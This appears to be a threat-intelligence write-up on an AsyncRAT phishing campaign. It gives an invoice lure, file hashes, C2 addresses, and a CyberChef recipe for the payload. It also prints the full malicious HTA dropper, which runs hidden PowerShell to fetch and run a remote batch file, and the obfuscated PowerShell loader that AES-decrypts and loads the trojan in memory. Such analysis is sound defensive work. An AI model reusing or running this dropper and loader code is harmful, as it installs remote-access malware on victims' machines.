THREAT IDENTIFICATION:  ASYNCRAT

SUBJECTS OBSERVED
Unpaid Invoice #09848006 DUE

SENDERS OBSERVED
teresa@dhreportmail.com

EMAIL ATTACHMENT FILE HASH
Invoice #09848006.one
549806054541b8a9c2fc81ca0114dd08

EMBEDDED HTA FILE HASH
temp.eno.hta
04397987a9b96975f09406ec79e2266b

EMBEDDED HTA FILE CONTENTS
<!DOCTYPE html>
<html>
<head>
<HTA:APPLICATION icon="#" WINDOWSTATE="normal" SHOWINTASKBAR="no" SYSMENU="no"  CAPTION="no" BORDER="none" SCROLL="no" />
<script type="text/vbscript">

' Exec process using WMI
Function WmiExec(cmdLine ) 
    Dim objConfig 
    Dim objProcess 
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = 0
    Set objProcess = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
    WmiExec = dukpatek(objProcess, objConfig, cmdLine)
End Function

Private Function dukpatek(myObjP , myObjC , myCmdL ) 
    Dim procId 
    dukpatek = myObjP.Create(myCmdL, Null, myObjC, procId)
End Function

Sub AutoOpen()
    ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri https://www.onenotegem.com/uploads/soft/one-templates/stg-a4l.one -OutFile $env:tmp\invoice.one; Start-Process -Filepath $env:tmp\invoice.one"
        ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri https://transfer.sh/get/p5lj4U/invoice.bat -OutFile $env:tmp\system32.bat; Start-Process -Filepath $env:tmp\system32.bat"
End Sub

' Exec process using WScript.Shell (asynchronous)
Sub WscriptExec(cmdLine )
    CreateObject("WScript.Shell").Run cmdLine, 0
End Sub

Sub ExecuteCmdAsync(targetPath )
    On Error Resume Next
    Err.Clear
    wimResult = WmiExec(targetPath)
    If Err.Number <> 0 Or wimResult <> 0 Then
        Err.Clear
        WscriptExec targetPath
    End If
    On Error Goto 0
End Sub

window.resizeTo 0,0
AutoOpen
Close
</script>
</head>
<body>
</body>
</html>

DOWNLOAD URLS FROM THE HTA FILE
https://www.onenotegem.com/uploads/soft/one-templates/stg-a4l.one
https://transfer.sh/get/p5lj4U/invoice.bat

DUMMY "INVOICE" FILE HASH
stg-a4l.one
65387597dce1f6ca37d8ae34e99bad2e

DOWNLOADED BAT FILE HASH
invoice.bat
36753b61c8e886f0f49388f72b2435ac

DECODED BAT FILE CONTENTS 
C:\Users\analyst\Documents\samples>echo "downloaded.bat.exe" -noprofile -windowstyle hidden -ep bypass -command $qfpLe = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('C:\Users\analyst\Documents\samples\downloaded.bat').Split([Environment]::NewLine);foreach ($zbumi in $qfpLe) { if ($zbumi.StartsWith(':: ')) {  $gJJDY = $zbumi.Substring(3); break; }; };$Piqdg = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($gJJDY);$edVwk = New-Object System.Security.Cryptography.AesManaged;$edVwk.Mode = [System.Security.Cryptography.CipherMode]::CBC;$edVwk.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;$edVwk.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('Aiiudw+fXb86Mnh/w13gDxuD3EbVUZkaOyGHqMc/CQY=');$edVwk.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('sx2hI0APZjv9Fq8D3SERvQ==');$imDxS = $edVwk.CreateDecryptor();$Piqdg = $imDxS.TransformFinalBlock($Piqdg, 0, $Piqdg.Length);$imDxS.Dispose();$edVwk.Dispose();$YZKNZ = New-Object System.IO.MemoryStream(, $Piqdg);$JKRAg = New-Object System.IO.MemoryStream;$YtWFs = New-Object System.IO.Compression.GZipStream($YZKNZ, [IO.Compression.CompressionMode]::Decompress);$YtWFs.CopyTo($JKRAg);$YtWFs.Dispose();$YZKNZ.Dispose();$JKRAg.Dispose();$Piqdg = $JKRAg.ToArray();$DtnJj = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($Piqdg);$rYEbR = $DtnJj.EntryPoint;$rYEbR.Invoke($null, (, [string[]] (''))) 
"downloaded.bat.exe" -noprofile -windowstyle hidden -ep bypass -command $qfpLe = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('C:\Users\analyst\Documents\samples\downloaded.bat').Split([Environment]::NewLine);foreach ($zbumi in $qfpLe) { if ($zbumi.StartsWith(':: ')) {  $gJJDY = $zbumi.Substring(3); break; }; };$Piqdg = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($gJJDY);$edVwk = New-Object System.Security.Cryptography.AesManaged;$edVwk.Mode = [System.Security.Cryptography.CipherMode]::CBC;$edVwk.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;$edVwk.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('Aiiudw+fXb86Mnh/w13gDxuD3EbVUZkaOyGHqMc/CQY=');$edVwk.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('sx2hI0APZjv9Fq8D3SERvQ==');$imDxS = $edVwk.CreateDecryptor();$Piqdg = $imDxS.TransformFinalBlock($Piqdg, 0, $Piqdg.Length);$imDxS.Dispose();$edVwk.Dispose();$YZKNZ = New-Object System.IO.MemoryStream(, $Piqdg);$JKRAg = New-Object System.IO.MemoryStream;$YtWFs = New-Object System.IO.Compression.GZipStream($YZKNZ, [IO.Compression.CompressionMode]::Decompress);$YtWFs.CopyTo($JKRAg);$YtWFs.Dispose();$YZKNZ.Dispose();$JKRAg.Dispose();$Piqdg = $JKRAg.ToArray();$DtnJj = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($Piqdg);$rYEbR = $DtnJj.EntryPoint;$rYEbR.Invoke($null, (, [string[]] ('')))

DECRYPTION KEYS USED TO DECRYPT PAYLOAD
These 2 base64 blobs are used to decrypt the payload:
Key:
Aiiudw+fXb86Mnh/w13gDxuD3EbVUZkaOyGHqMc/CQY=

IV:
sx2hI0APZjv9Fq8D3SERvQ==

CYBERCHEF RECIPE TO DECRYPT PAYLOAD
From_Base64('A-Za-z0-9+/=',true,false)
AES_Decrypt({'option':'Base64','string':'Aiiudw+fXb86Mnh/w13gDxuD3EbVUZkaOyGHqMc/CQY='},{'option':'Base64','string':'sx2hI0APZjv9Fq8D3SERvQ=='},'CBC','Raw','Raw',{'option':'Hex','string':''},{'option':'Hex','string':''})
Gunzip()

EXTRACTED PAYLOAD FILE HASH
extracted.exe
257051c0097634d806ae4919c8fd2824    

LIKELY C2
newtryex.ddns.net:8808
154.12.234.207:8808

STRINGS FOM MEMORY
0x8ce760 (19): AsyncClient NEW.exe
0x2c88cdc (40): AsyncMutex_6SI8OkPnk
0x2c94d73 (17): AsyncRAT Server0 


